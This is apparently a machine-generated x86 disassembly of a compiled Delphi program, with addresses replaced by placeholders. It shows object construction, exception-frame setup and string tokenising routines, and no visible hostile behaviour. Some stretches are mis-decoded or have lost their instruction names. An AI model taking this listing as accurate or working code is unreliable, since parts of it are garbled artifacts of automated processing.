push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_469889
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ edi + 0x24 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop ecx
mov esi eax
mov [ ebx + 0x14 ] esi
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_469890
lea eax [ ebp - 0x20 ]
mov edx 0x7
call sub_404074
retn
mov edx ebx
mov eax esi
call sub_46499c
test eax eax
jg r-xdata
mov [ ebx + 0x10 ] edi
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebx + 0x14 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add esp 0x8
mov eax [ ebx + 0x14 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop ecx
test eax eax
jg r-xdata
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405b50
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b590
call sub_403a08
jmp r-xdata
push r-xdata
mov eax ebx
call sub_469b84
lea edx [ ebp - 0x14 ]
call sub_469ce4
push [ ebp - 0x14 ]
push r-xdata
push r-xdata
mov eax ebx
call sub_469b84
lea edx [ ebp - 0x18 ]
call sub_469ca0
push [ ebp - 0x18 ]
push r-xdata
push r-xdata
mov eax ebx
call sub_469b84
call sub_469d10
lea edx [ ebp - 0x1c ]
call sub_407f48
push [ ebp - 0x1c ]
push r-xdata
push r-xdata
mov eax ebx
call sub_469b84
lea edx [ ebp - 0x20 ]
call sub_469d3c
push [ ebp - 0x20 ]
push r-xdata
lea eax [ ebp - 0x8 ]
mov edx 0xc
call sub_4043d0
mov esi [ ebx + 0xc ]
mov eax esi
mov edx [ r-xdata ]
call sub_403420
test al al
je r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405b50
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b590
call sub_403a08
mov eax esi
mov edx [ r-xdata ]
call sub_403444
mov edx [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
sub_4698f8
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_469a7e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop ecx
mov esi eax
mov [ ebx + 0x14 ] esi
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_469a85
lea eax [ ebp - 0x20 ]
mov edx 0x7
call sub_404074
retn
mov edx ebx
mov eax esi
call sub_46499c
test eax eax
jg r-xdata
push edi
mov eax [ ebx + 0x14 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add esp 0x8
mov eax [ ebx + 0x14 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop ecx
test eax eax
jg r-xdata
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405b50
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b590
call sub_403a08
jmp r-xdata
push r-xdata
mov eax ebx
call sub_469b84
lea edx [ ebp - 0x14 ]
call sub_469ce4
push [ ebp - 0x14 ]
push r-xdata
push r-xdata
mov eax ebx
call sub_469b84
lea edx [ ebp - 0x18 ]
call sub_469ca0
push [ ebp - 0x18 ]
push r-xdata
push r-xdata
mov eax ebx
call sub_469b84
call sub_469d10
lea edx [ ebp - 0x1c ]
call sub_407f48
push [ ebp - 0x1c ]
push r-xdata
push r-xdata
mov eax ebx
call sub_469b84
lea edx [ ebp - 0x20 ]
call sub_469d3c
push [ ebp - 0x20 ]
push r-xdata
lea eax [ ebp - 0x8 ]
mov edx 0xc
call sub_4043d0
mov esi [ ebx + 0xc ]
mov eax esi
mov edx [ r-xdata ]
call sub_403420
test al al
je r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405b50
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b590
call sub_403a08
mov eax esi
mov edx [ r-xdata ]
call sub_403444
mov edx [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x60 ]
sub_469aec
push ebx
push esi
push edi
push ebp
mov ebp ecx
mov edi edx
mov ebx eax
push ebp
push edi
mov eax [ ebx + 0x14 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add esp 0xc
mov esi eax
mov edx esi
mov eax ebx
call sub_4696a4
cmp eax 0x2
je r-xdata
push ebp
push edi
mov eax [ ebx + 0x14 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add esp 0xc
mov esi eax
cmp eax 0x3
jne r-xdata
mov eax esi
pop ebp
pop edi
pop esi
pop ebx
retn
sub_469b38
push ebx
push esi
push edi
push ebp
mov ebp ecx
mov edi edx
mov ebx eax
push ebp
push edi
mov eax [ ebx + 0x14 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add esp 0xc
mov esi eax
mov edx esi
mov eax ebx
call sub_4696a4
cmp eax 0x2
je r-xdata
push ebp
push edi
mov eax [ ebx + 0x14 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add esp 0xc
mov esi eax
cmp eax 0x3
jne r-xdata
mov eax esi
pop ebp
pop edi
pop esi
pop ebx
retn
sub_469b84
push ebx
mov ebx eax
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
mov eax [ ebx + 0x8 ]
pop ebx
retn
cmp [ ebx + 0x14 ] 0x0
je r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_469c3c
mov [ ebx + 0x8 ] eax
sub_469bac
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403264
mov [ edi + 0x4 ] esi
xor eax eax
mov [ edi + 0x8 ] eax
xor eax eax
mov [ edi + 0xc ] eax
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035a0
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4035f8
pop [ fs : 0x0 ]
add esp 0xc
sub_469bf4
push ebx
push esi
push edi
call sub_403608
mov ebx edx
mov edi eax
mov esi [ edi + 0x8 ]
test esi esi
je r-xdata
mov esi [ edi + 0xc ]
test esi esi
je r-xdata
mov eax esi
mov dl 0x1
mov ecx [ eax ]
call [ ecx - 0x4 ]
mov edx ebx
and dl 0xfc
mov eax edi
call sub_403284
test bl bl
jle r-xdata
mov eax esi
mov dl 0x1
mov ecx [ eax ]
call [ ecx - 0x4 ]
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_4035f0
sub_469c3c
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403264
mov [ edi + 0x4 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035a0
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4035f8
pop [ fs : 0x0 ]
add esp 0xc
sub_469c78
push ebx
push esi
call sub_403608
mov ebx edx
mov esi eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403284
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035f0
sub_469ca0
push ebx
push esi
add esp 0xfffffbfc
mov esi edx
mov ebx eax
push 0x400
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x14 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop ecx
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add esp 0xc
mov edx esi
call sub_408820
add esp 0x404
pop esi
pop ebx
retn
sub_469ce4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x14 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop ecx
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop ecx
mov edx esi
call sub_408820
pop esi
pop ebx
retn
sub_469d10
push ebx
push ecx
mov ebx eax
push esp
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x14 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop ecx
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add esp 0x8
mov eax [ esp ]
pop edx
pop ebx
retn
sub_469d3c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x14 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop ecx
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop ecx
mov edx esi
call sub_408820
pop esi
pop ebx
retn
sub_469d68
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_469d94
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_469d9b
retn
call sub_468748
sub_469e63
inc [ edx ]
add [ eax ] al
add [ edx ] bl
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_469eb1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_469eb8
retn
mov eax rw-data
call sub_404050
mov eax rw-data
call sub_404050
mov eax rw-data
call sub_404050
sub_469ff4
push ebp
mov ebp esp
add esp 0xffffff94
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x6c ] ebx
mov [ ebp - 0x48 ] ebx
mov [ ebp - 0x44 ] ebx
mov esi ecx
lea edi [ ebp - 0x40 ]
mov ecx 0x8
[ edi ] [ esi ]
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_46a1fa
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0xc ] 0x1
mov esi 0x1
mov [ ebp - 0x10 ] 0x1
xor edi edi
mov [ ebp - 0x19 ] 0x20
mov [ ebp - 0x1a ] 0x0
mov eax [ ebp - 0x4 ]
call sub_404310
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x8 ]
call sub_404310
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0x8 ]
call sub_404050
cmp esi [ ebp - 0x14 ]
jg r-xdata
lea eax [ ebp - 0x6c ]
push eax
mov ecx 0x7fffffff
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_404570
mov edx [ ebp - 0x6c ]
mov eax [ ebp + 0x8 ]
call sub_404318
mov eax [ ebp + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46a201
lea eax [ ebp - 0x6c ]
call sub_404050
lea eax [ ebp - 0x48 ]
mov edx 0x2
call sub_404074
retn
mov eax [ ebp - 0x4 ]
mov bl [ eax + esi - 0x1 ]
mov eax [ rw-data ]
mov edx ebx
and edx 0xff
bt [ eax ] edx
jae r-xdata
mov eax [ ebp - 0x8 ]
cmp bl [ eax ]
jne r-xdata
inc esi
inc [ ebp - 0xc ]
jmp r-xdata
mov eax ebx
and eax 0xff
bt [ ebp - 0x40 ] eax
jae r-xdata
cmp [ ebp - 0x19 ] 0x20
jne r-xdata
inc esi
inc [ ebp - 0xc ]
mov al [ ebp - 0x19 ]
sub al 0x22
je r-xdata
mov eax ebx
sub al 0x22
jne r-xdata
cmp [ ebp - 0x19 ] 0x20
jne r-xdata
lea eax [ ebp - 0x44 ]
push eax
mov ecx [ ebp - 0x18 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_404570
mov edx [ ebp - 0x44 ]
mov eax [ ebp - 0x8 ]
call sub_407ddc
mov [ ebp - 0x1a ] al
cmp [ ebp - 0x1a ] 0x0
je r-xdata
cmp esi [ ebp - 0x14 ]
jle r-xdata
cmp [ ebp - 0x1a ] 0x0
jne r-xdata
cmp bl [ ebp - 0x19 ]
jne r-xdata
mov edi esi
jmp r-xdata
mov eax [ ebp - 0x18 ]
dec eax
add esi eax
mov edi esi
jmp r-xdata
mov eax esi
sub eax edi
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x48 ]
push eax
mov ecx edi
sub ecx [ ebp - 0x10 ]
inc ecx
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_404570
mov edx [ ebp - 0x48 ]
mov eax [ ebp + 0x8 ]
call sub_404318
mov eax [ ebp + 0x8 ]
sub bl 0x22
je r-xdata
mov eax [ ebp - 0xc ]
cmp eax [ ebp + 0xc ]
jle r-xdata
cmp [ ebp - 0x19 ] 0x20
jne r-xdata
mov [ ebp - 0x19 ] 0x20
jmp r-xdata
cmp [ ebp - 0x1a ] 0x0
jne r-xdata
jmp r-xdata
cmp edi [ ebp - 0x10 ]
jle r-xdata
mov [ ebp - 0x19 ] bl
inc edi
mov [ ebp - 0x10 ] edi
mov [ ebp - 0x1a ] 0x0
cmp esi [ ebp - 0x14 ]
jge r-xdata
cmp esi [ ebp - 0x14 ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x8 ]
call sub_404318
mov eax [ ebp + 0x8 ]
push esi
push edi
lea esi [ ebp - 0x40 ]
lea edi [ ebp - 0x68 ]
mov ecx 0x8
[ edi ] [ esi ]
pop edi
pop esi
lea eax [ ebp - 0x68 ]
mov edx r-xdata
mov cl 0x20
call sub_402ddc
mov eax [ ebp - 0x4 ]
mov al [ eax + esi - 0x1 ]
and eax 0xff
bt [ ebp - 0x68 ] eax
jb r-xdata
inc esi
sub_46a22c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403264
lea eax [ esi + 0x30 ]
mov edx r-xdata
call sub_4040a4
mov [ esi + 0x34 ] 0x0
mov [ esi + 0x35 ] 0x1
mov [ esi + 0x36 ] 0x1
mov [ esi + 0x38 ] 0x4e
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035a0
mov eax esi
pop esi
pop ebx
retn
call sub_4035f8
pop [ fs : 0x0 ]
add esp 0xc
sub_46a290
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_46a320
push [ fs : eax ]
mov [ fs : eax ] esp
inc esi
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x14 ]
cmp esi eax
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46a327
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_404074
retn
lea ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_404310
test eax eax
jle r-xdata
lea ecx [ ebp - 0xc ]
mov edx esi
mov eax ebx
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0xc ]
cmp [ eax ] 0x9
je r-xdata
lea ecx [ ebp - 0x8 ]
mov edx esi
mov eax ebx
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x20
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x48 ]
sub_46a330
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_404500
xor eax eax
push ebp
push sub_46a405
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_46a414
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_46a3db
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
lea ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0xc ]
mov edi [ eax ]
call [ edi + 0xc ]
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov eax esi
mov edi [ eax ]
call [ edi + 0x20 ]
dec ebx
cmp ebx 0xffffffff
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46a3e2
lea eax [ ebp - 0xc ]
call sub_40d19c
retn
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0xc ]
mov edi [ eax ]
call [ edi + 0xc ]
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x8 ]
mov eax esi
mov edi [ eax ]
call [ edi + 0x60 ]
dec ebx
cmp ebx 0xffffffff
jg r-xdata
sub_46a414
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_404500
xor eax eax
push ebp
push sub_46a4dc
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_403264
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_46a4b2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x38 ]
push eax
lea eax [ ebp - 0xc ]
push eax
mov ecx r-xdata
mov edx r-xdata
mov eax [ ebp - 0x4 ]
call sub_469ff4
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
push 0x1
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0xc ]
mov cl 0x1
mov edx r-xdata
call sub_45d338
mov eax [ ebp - 0x14 ]
lea edx [ ebp - 0x10 ]
call sub_407e64
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46a4b9
retn
sub_46a524
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_46a5b2
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
cmp [ esi + 0x34 ] 0x0
jne r-xdata
lea edx [ ebp - 0xc ]
mov eax [ esi + 0x30 ]
call sub_407e64
mov eax [ ebp - 0xc ]
mov esi [ rw-data ]
mov esi [ esi ]
mov edx [ ebx ]
call esi
mov esi eax
push ebx
mov ecx esi
dec ecx
mov eax [ ebx ]
mov edx 0x1
call sub_404570
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46a5b9
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_404074
retn
lea edx [ ebp - 0x8 ]
mov eax [ ebx ]
call sub_407bf8
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_4040a4
sub_46a5c0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_46a710
mov edx eax
mov ecx edi
mov eax ebx
call sub_46a5e4
pop edi
pop esi
pop ebx
retn
sub_46a5e4
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_46a6f4
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x4 ]
call sub_404050
mov eax esi
mov edx [ eax ]
call [ edx + 0x14 ]
cmp ebx eax
jge r-xdata
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax esi
call sub_46a524
mov eax [ ebp - 0x4 ]
push eax
lea ecx [ ebp - 0x10 ]
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0xc ]
call sub_404310
mov edx eax
add edx 0x2
mov ecx 0x7fffffff
pop eax
call sub_404570
cmp [ esi + 0x35 ] 0x0
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_407e14
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_4040a4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46a6fb
lea eax [ ebp - 0x1c ]
mov edx 0x6
call sub_404074
retn
inc ebx
mov eax esi
mov edx [ eax ]
call [ edx + 0x14 ]
cmp ebx eax
je r-xdata
lea ecx [ ebp - 0x8 ]
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x8 ]
mov al [ eax ]
sub al 0x9
je r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_407e14
push [ ebp - 0x14 ]
push r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x8 ]
call sub_407e14
push [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
mov edx 0x3
call sub_4043d0
jmp r-xdata
sub al 0x17
jne r-xdata
sub_46a710
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_46a783
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x8 ] 0xffffffff
mov eax edi
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46a78a
lea eax [ ebp - 0xc ]
call sub_404050
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov [ ebp - 0x8 ] ebx
jmp r-xdata
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax edi
call sub_46a524
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
call sub_407ddc
test al al
je r-xdata
sub_46a794
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_46a85f
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx edi
mov eax ebx
call sub_46a710
mov esi eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test esi esi
jl r-xdata
test esi esi
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46a866
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_404074
retn
cmp [ ebx + 0x36 ] 0x0
je r-xdata
cmp [ ebx + 0x36 ] 0x0
je r-xdata
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov esi eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx esi
mov eax ebx
call sub_46a290
push edi
push [ ebx + 0x30 ]
push [ ebp - 0x4 ]
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_4043d0
mov ecx [ ebp - 0xc ]
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x20 ]
jmp r-xdata
mov edx esi
mov eax ebx
call sub_46a290
push edi
push [ ebx + 0x30 ]
push [ ebp - 0x4 ]
lea eax [ ebp - 0x8 ]
mov edx 0x3
call sub_4043d0
mov edx [ ebp - 0x8 ]
mov ecx esi
mov eax ebx
call sub_46a330
jmp r-xdata
sub_46a870
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_46a895
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46a89c
retn
sub_46a8c0
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov edi eax
mov eax [ ebp + 0x8 ]
xor edx edx
push ebp
push sub_46a9a7
push [ fs : edx ]
mov [ fs : edx ] esp
test esi esi
jne r-xdata
test al al
je r-xdata
test al al
je r-xdata
lea eax [ ebp - 0x18 ]
push eax
mov eax ebx
call sub_404310
mov ecx eax
mov edx esi
mov eax ebx
call sub_404570
mov edx [ ebp - 0x18 ]
mov eax edi
call sub_404654
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
mov eax ebx
call sub_404310
mov ecx eax
mov edx esi
mov eax ebx
call sub_404570
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
call sub_407d38
mov eax [ ebp - 0xc ]
push eax
lea edx [ ebp - 0x14 ]
mov eax edi
call sub_407d38
mov eax [ ebp - 0x14 ]
pop edx
call sub_404654
mov ebx eax
jmp r-xdata
mov edx ebx
mov eax edi
call sub_404654
mov ebx eax
jmp r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_407d38
mov eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax edi
call sub_407d38
mov eax [ ebp - 0x8 ]
pop edx
call sub_404654
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46a9ae
lea eax [ ebp - 0x18 ]
mov edx 0x6
call sub_404074
retn
add ebx esi
dec ebx
test ebx ebx
jle r-xdata
sub_46a9bc
push ebp
mov ebp esp
mov ecx 0xe
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_404500
xor eax eax
push ebp
push sub_46aec7
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
lea edx [ ebp - 0x2c ]
mov eax [ ebp - 0x4 ]
call sub_407bf8
mov edx [ ebp - 0x2c ]
mov ecx 0x1
mov eax r-xdata
call sub_46a8c0
mov ebx eax
test ebx ebx
jne r-xdata
test ebx ebx
jle r-xdata
push 0x0
lea edx [ ebp - 0x30 ]
mov eax [ ebp - 0x4 ]
call sub_407bf8
mov edx [ ebp - 0x30 ]
mov ecx 0x1
mov eax r-xdata
call sub_46a8c0
mov ebx eax
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_404654
test eax eax
jg r-xdata
mov [ ebp - 0x25 ] 0x1
push 0x0
lea edx [ ebp - 0x34 ]
mov eax [ ebp - 0x4 ]
call sub_407bf8
mov edx [ ebp - 0x34 ]
lea ecx [ ebx + 0x5 ]
mov eax r-xdata
call sub_46a8c0
mov edi eax
test edi edi
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_404654
mov edx eax
lea eax [ ebp - 0x4 ]
mov ecx 0x1
call sub_4045b0
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_4040a4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46aece
lea eax [ ebp - 0x74 ]
mov edx 0x8
call sub_404074
lea eax [ ebp - 0x48 ]
mov edx 0x8
call sub_404074
lea eax [ ebp - 0x24 ]
call sub_404050
lea eax [ ebp - 0x18 ]
mov edx 0x3
call sub_404074
lea eax [ ebp - 0x4 ]
call sub_404050
retn
cmp [ ebp - 0x25 ] 0x0
je r-xdata
mov [ ebp - 0x25 ] 0x0
cmp [ ebp - 0x25 ] 0x0
je r-xdata
push 0x0
lea edx [ ebp - 0x38 ]
mov eax [ ebp - 0x4 ]
call sub_407bf8
mov edx [ ebp - 0x38 ]
lea ecx [ edi + 0x1 ]
mov eax r-xdata
call sub_46a8c0
mov edi eax
test edi edi
jne r-xdata
push 0x0
lea edx [ ebp - 0x70 ]
mov eax [ ebp - 0x4 ]
call sub_407bf8
mov edx [ ebp - 0x70 ]
lea ecx [ ebx + 0x1 ]
mov eax r-xdata
call sub_46a8c0
mov ebx eax
test ebx ebx
jne r-xdata
push 0x0
lea edx [ ebp - 0x3c ]
mov eax [ ebp - 0x4 ]
call sub_407bf8
mov edx [ ebp - 0x3c ]
lea ecx [ edi + 0x1 ]
mov eax r-xdata
call sub_46a8c0
mov edi eax
test edi edi
jle r-xdata
mov [ ebp - 0x25 ] 0x0
test ebx ebx
jg r-xdata
push 0x0
lea edx [ ebp - 0x74 ]
mov eax [ ebp - 0x4 ]
call sub_407bf8
mov edx [ ebp - 0x74 ]
lea ecx [ ebx + 0x1 ]
mov eax r-xdata
call sub_46a8c0
mov ebx eax
lea eax [ ebp - 0x24 ]
push eax
mov ecx edi
sub ecx ebx
add ecx 0x2
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_404570
mov esi 0x1
jmp r-xdata
cmp esi 0x2
jne r-xdata
lea eax [ ebp - 0x14 ]
push eax
mov edx [ ebp - 0x24 ]
mov eax r-xdata
call sub_404654
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x24 ]
call sub_404570
jmp r-xdata
inc esi
cmp esi 0x4
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
mov ecx 0x1
mov edx 0x1
mov eax [ ebp - 0x24 ]
call sub_404570
